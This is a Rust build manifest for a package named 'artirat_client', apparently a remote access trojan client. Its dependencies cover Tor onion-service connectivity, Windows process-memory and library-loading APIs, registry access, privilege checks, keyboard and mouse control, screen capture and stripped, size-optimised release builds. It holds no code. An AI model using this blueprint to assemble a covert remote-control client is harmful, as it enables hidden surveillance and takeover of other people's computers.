[package]
name = "artirat_client"
version = "0.2.1"
edition = "2024"
autolib = false
autobins = false

[target.'cfg(windows)'.dependencies]
winapi = {version = "0.3.9", features=[
    "memoryapi",
    "libloaderapi",
    "winuser", 
    "processthreadsapi", 
    "psapi", 
    "handleapi", 
    "minwindef",
    "fileapi",
    "ioapiset",
    "wow64apiset",
    "ntdef",
    "winnt",
    "synchapi"
] }
windows = { version = "0.62.2", features = [
    "Win32_System_SystemServices",
    "Win32_System_WindowsProgramming"
] }
winres = "0.1.11"
win32-error = "0.9.0"
winreg = "0.56.0"
is_elevated = "0.1.2"
windows-sys = { version = "0.61.2", features = ["Win32_UI_WindowsAndMessaging"] }
[dependencies]
arti-client = { version = "0.42", features = ["onion-service-client","rustls","static-sqlite"] }
gethostname = "1.1.0"
tor-rtcompat = { version = "0.42", features = ["rustls", "tokio"] }
tokio = { version = "1", features = ["full"] }
anyhow = "1"
rusqlite = { version = "0.39.0", features = ["bundled"] }
zstd = { version = "0.13.3", features = ["zstdmt"] }
openssl = { version = "0.10.79", features = ["vendored"] }
openssl-sys = { version = "0.9", features = ["vendored"] }
base64 = "0.22"
uuid = { version = "1.11.1", features = ["v4"] }
libc = { version = "0.2.186", features = ["align", "extra_traits", "use_std"] }
tempfile = "3"
sysinfo = "0.39.1"
itertools = "0.14.0"
enigo = { version = "0.6.1", features = ["platform_specific", "tokio"] }
rand = { version = "0.8", features = [] }
[target.'cfg(not(target_os = "android"))'.dependencies]
screenshots = "0.8.10"

[[bin]]
name = "artirat_client"
path = "src/main.rs"

[profile.release]
opt-level = "z"
debug = 0
lto = true
codegen-units = 1
strip = true
panic = "abort"
